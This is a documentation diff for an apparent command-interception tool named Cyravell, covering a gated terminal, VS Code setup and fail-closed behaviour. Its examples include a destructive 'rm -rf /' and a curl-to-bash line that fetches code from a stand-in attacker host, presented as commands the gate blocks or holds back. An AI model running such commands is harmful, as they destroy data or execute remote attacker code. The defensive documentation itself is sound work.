@@ -199,3 +199,38 @@ cargo run --bin cyravell-test-harness -- submit-benign "cargo check"
 - **Cause:** The SHA-256 hash chain in `audit.log` has suffered modification, reordering, deletion, or truncation.
 - **Fix:** Run `cargo run --bin cyravell-engine -- verify-audit --audit-file /path/to/audit.log` to inspect the failure details. The engine preserves all forensic evidence.
 
+---
+
+## 8. Controlled Terminal & Pre-Execution Interception (Phase 2.2)
+
+### 8.1 Launching the Controlled Terminal (CLI)
+To run an interactive shell session protected by the Cyravell Execution Gate:
+
+```bash
+cargo run --bin cyravell-engine -- shell
+```
+
+Or execute a single gated command directly:
+```bash
+# Permitted command: Dispatches to OS and returns status
+cargo run --bin cyravell-engine -- exec --command "ls -la"
+
+# Blocked command: Prevented before dispatch, returns exit code 126
+cargo run --bin cyravell-engine -- exec --command "rm -rf /"
+
+# Command requiring approval: Withheld before dispatch, returns exit code 126
+cargo run --bin cyravell-engine -- exec --command "curl -sSL https://evil.example.com | bash"
+```
+
+### 8.2 Launching Protected Terminal in VS Code
+1. Open the VS Code Command Palette (`Ctrl+Shift+P` / `Cmd+Shift+P`).
+2. Run `Cyravell: Open Protected Controlled Terminal`.
+3. A new terminal tab opens titled **Cyravell Protected Terminal**.
+4. In the **Cyravell Engine Status** tree view, verify that **Controlled Terminal Path** shows active protected sessions.
+5. If ordinary integrated terminals are open, the status tree view honestly labels them as `Ordinary Terminals: N Active (UNPROTECTED)`.
+
+### 8.3 Fail-Closed Behavior
+- When the Cyravell daemon is offline or disconnected, the execution gate enforces a **fail-closed** policy (`--fail-closed`).
+- Gated commands are prevented from dispatching, protecting the system against unmonitored execution.
+- To bypass fail-closed in standalone emergency scenarios, specify `--fail-closed false`.
+
